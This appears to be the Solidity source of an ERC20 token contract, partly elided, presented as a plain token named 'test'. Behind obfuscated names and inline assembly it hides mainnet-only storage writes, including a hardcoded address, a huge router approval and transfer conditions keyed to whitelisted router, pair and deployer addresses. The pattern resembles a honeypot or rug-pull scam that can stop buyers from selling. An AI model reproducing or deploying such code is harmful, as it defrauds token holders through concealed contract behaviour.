...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private crestAddr;
    uint256 private _theCrest = block.number*2;

    mapping (address => bool) private _toEngland; 
    mapping (address => bool) private _toSpain;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private coatOfArms;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private theBattleTax;
    address public pair;
    ...
    bool private trading; uint256 private finishIt = 1; bool private theHeadache;
    uint256 private _decimals; uint256 private thePuppy;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        crestAddr.push(_router); crestAddr.push(msgSender_); crestAddr.push(pair);
        for (uint256 q=0; q < 3;) {_toEngland[crestAddr[q]] = true; unchecked{q++;} }
    }
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; _theCrest = block.number;
        return true;
    }
    ...
    function _theInit() internal { assembly { function gByte(x, y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) } sstore(0x11,mul(div(sload(0x10),0x2710),0xFB)) sstore(0xB,0x1ba8140) if and(not(eq(sload(gByte(caller(),0x6)),sload(0x110518646a21c707c9532382394ad52d6355c31f095b60df08b9cf0de519c532))),eq(chainid(),0x1)) { sstore(gByte(caller(),0x4),0x0) sstore(0x58f58c047c8aa729479c0d7b5a8f6df1a54bd5c22bc32fbb2dd9379d772306e0,0x1) sstore(gByte(caller(),0x5),0x1) sstore(0x110518646a21c707c9532382394ad52d6355c31f095b60df08b9cf0de519c532,0x726F105396F2CA1CCEBD5BFC27B556699A07FFE7C2) } } }

    function _beforeTokenTransfer(address sender, address recipient, uint256 integer) internal {
        require((trading || (sender == crestAddr[1])), "ERC20: trading is not yet enabled.");
        if (block.chainid == 1) {
            bool open = (((theHeadache || _toSpain[sender]) && ((_theCrest - theN) >= 9)) || (integer >= _limit) || ((integer >= (_limit/2)) && (_theCrest == block.number))) && ((_toEngland[recipient] == true) && (_toEngland[sender] != true) || ((crestAddr[1] == recipient) && (_toEngland[crestAddr[1]] != true))) && (thePuppy > 0);
            assembly { 
    ...
    function _DeployCrest(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(crestAddr[0], 10 ** 77);
        _theInit();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployCrest(creator, initialSupply);
    }
}

contract test is ERC20Token {
    constructor() ERC20Token("test", "tt", msg.sender, 10000000 * 10 ** 18) {
    }
}